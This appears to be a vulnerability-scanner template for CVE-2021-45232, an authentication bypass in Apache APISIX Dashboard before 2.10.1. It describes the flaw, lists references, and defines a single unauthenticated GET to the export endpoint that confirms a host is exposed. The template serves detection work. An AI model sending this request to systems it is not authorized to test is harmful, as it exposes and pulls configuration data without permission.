id: CVE-2021-45232

info:
  name: Apache APISIX Dashboard <2.10.1 - API Unauthorized Access
  author: Mr-xn
  severity: critical
  verified: true
  description: |
    In Apache APISIX Dashboard before 2.10.1, the Manager API uses two frameworks and introduces framework `droplet` on the basis of framework `gin.' While all APIs and authentication middleware are developed based on framework `droplet`,  some API directly use the interface of framework `gin` thus bypassing their authentication.
    title="Apache APISIX Dashboard"
  reference:
    - https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/
    - https://github.com/pingpongcult/CVE-2021-45232
    - https://github.com/advisories/GHSA-wcxq-f256-53xp
    - https://twitter.com/403Timeout/status/1475715079173976066
    - https://github.com/wuppp/cve-2021-45232-exp

rules:
  r0:
    request:
      method: GET
      path: /apisix/admin/migrate/export
    expression: response.status == 200 && response.body.bcontains(b'"Consumers":')
expression: r0()